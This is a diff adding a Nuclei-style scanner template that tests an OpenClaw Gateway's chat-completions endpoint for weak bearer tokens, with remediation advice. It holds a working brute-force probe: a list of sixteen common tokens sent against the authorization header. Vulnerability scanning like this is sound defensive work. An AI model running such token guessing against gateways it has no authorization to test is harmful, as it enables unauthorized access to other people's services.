@@ -1,0 +1,52 @@
+id: openclaw-weak-tokens
+info:
+  name: OpenClaw Gateway Weak Token Brute Force
+  author: LobsterGuard
+  severity: high
+  description: OpenClaw Gateway uses a weak/common token
+  tags: openclaw,brute,auth
+  remediation: Use a strong random token (openssl rand -hex 32) and enable rate limiting.
+  classification:
+    cwe-id: CWE-521
+  metadata:
+    max-request: 16
+    verified: false
+    product: openclaw
+    vendor: openclaw
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/v1/chat/completions"
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer §token§"
+    body: '{"model":"probe","messages":[]}'
+    attack: sniper
+    payloads:
+      token:
+        - change-me-to-a-long-random-token
+        - openclaw
+        - OpenClaw
+        - test
+        - test123
+        - admin
+        - admin123
+        - password
+        - token
+        - secret
+        - 123456
+        - default
+        - gateway
+        - lobster
+        - demo
+        - changeme
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: status
+        status:
+          - 400
